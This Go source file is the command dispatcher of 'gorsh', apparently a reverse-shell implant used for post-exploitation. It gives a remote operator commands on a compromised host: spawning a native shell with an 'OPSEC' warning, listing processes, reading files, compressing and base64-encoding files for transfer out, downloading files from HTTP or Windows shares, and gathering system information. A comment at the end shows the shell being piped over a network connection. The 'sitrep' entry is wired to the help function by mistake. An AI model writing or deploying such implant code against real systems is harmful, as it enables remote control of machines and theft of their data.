package commands

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"

	"github.com/audibleblink/gorsh/internal/directory"
	"github.com/audibleblink/gorsh/internal/fetch"
	"github.com/audibleblink/gorsh/internal/sitrep"
	"github.com/audibleblink/gorsh/internal/zip"
)

type CmdFunc func(...string) string

type Command struct {
	Name     string
	ArgHint  string
	Desc     string
	ArgCount int
	ArgReq   bool
	cmdFn    CmdFunc
}

func (c *Command) Help() string {
	return fmt.Sprintf("%-6s %-12s %s  %s\n", c.Name, c.ArgHint, "|", c.Desc)
}

func (c *Command) Execute(argv []string) string {
	var output string
	output = c.cmdFn(argv...)
	return output
}

var Commands []*Command

func init() {
	Commands = []*Command{
		&Command{
			"shell",
			"",
			"Drops into a native shell. Mind you OPSEC",
			0,
			false,
			nil},
		&Command{
			"cd",
			"[path]",
			"Change the process' working directory",
			1,
			false,
			cdFn},
		&Command{
			"ls",
			"[path]",
			"List the current working directory",
			1,
			false,
			lsFn},
		&Command{
			"pwd",
			"",
			"Print the current working directory",
			0,
			false,
			pwdFn},
		&Command{
			"ps",
			"",
			"Print process information",
			0,
			false,
			psFn},
		&Command{
			"cat",
			"<file>",
			"Print the contents of the given file",
			1,
			true,
			catFn},
		&Command{
			"zipcat",
			"<file>",
			"Compress, base64, and print the given file",
			1,
			true,
			zipcatFn},
		&Command{
			"base64",
			"<file>",
			"Base64 encode the given file and print",
			1,
			true,
			base64Fn},
		&Command{
			"fetch",
			"<URI> <file>",
			"Fetch stuff. http[s]:// or //share/folder (Windows only)",
			2,
			true,
			fetchFn},
		&Command{
			"sitrep",
			"",
			"Situation Awareness information",
			0,
			false,
			helpFn},
		&Command{
			"help",
			"",
			"Print this help menu",
			0,
			false,
			helpFn}}
}

func Route(argv []string) string {
	cmd := _find(argv[0])
	if cmd == nil {
		return "Command not found. Try 'help' for a list of available commands"
	}

	if cmd.ArgReq && cmd.ArgCount != len(argv)-1 {
		return fmt.Sprintf("Usage: %s %s\n", cmd.Name, cmd.ArgHint)
	}

	output := cmd.Execute(argv)
	return output
}

func cdFn(argv ...string) string {
	if len(argv) > 1 {
		os.Chdir(argv[1])
	} else {
		usr, _ := user.Current()
		os.Chdir(usr.HomeDir)
	}
	dir, _ := os.Getwd()
	return fmt.Sprintf("Current Directory: %s", dir)
}

func lsFn(argv ...string) string {
	output, err := directory.List(argv)
	if err != nil {
		return err.Error()
	}
	return output
}

func pwdFn(argv ...string) string {
	output, err := os.Getwd()
	if err != nil {
		return err.Error()
	}
	return output
}

func psFn(argv ...string) string {
	output := sitrep.Processes()
	return output
}

func catFn(file ...string) string {
	output, err := ioutil.ReadFile(file[1])
	if err != nil {
		return err.Error()
	}
	return string(output)
}

func zipcatFn(file ...string) string {
	bytes, err := zip.Bytes(file[1])
	if err != nil {
		return err.Error()
	} else {
		b64 := base64.StdEncoding.EncodeToString(bytes)
		return b64
	}
}

func base64Fn(file ...string) string {
	bytes, err := ioutil.ReadFile(file[1])
	if err != nil {
		return err.Error()
	} else {
		b64 := base64.StdEncoding.EncodeToString(bytes)
		return b64
	}
}

func fetchFn(file ...string) string {
	bytes, err := fetch.Get(file[1], file[2])
	if err != nil {
		return err.Error()
	}
	output := fmt.Sprintf("%d bytes copied to %s",
		bytes, file[1])
	return output
}

func sitrepFn(argv ...string) string {
	output := sitrep.SysInfo()
	return output
}

func helpFn(args ...string) string {
	var output string
	for _, cmd := range Commands {
		output += fmt.Sprintf(cmd.Help())
	}
	return output
}

func _find(cmd string) *Command {
	var outCmd *Command
	for _, c := range Commands {
		if cmd == c.Name {
			outCmd = c
		}
	}
	return outCmd
}

// switch argv[0] {
// case "shell":
// 	Send(conn, "Mind your OPSEC")
// 	RunShell(conn)
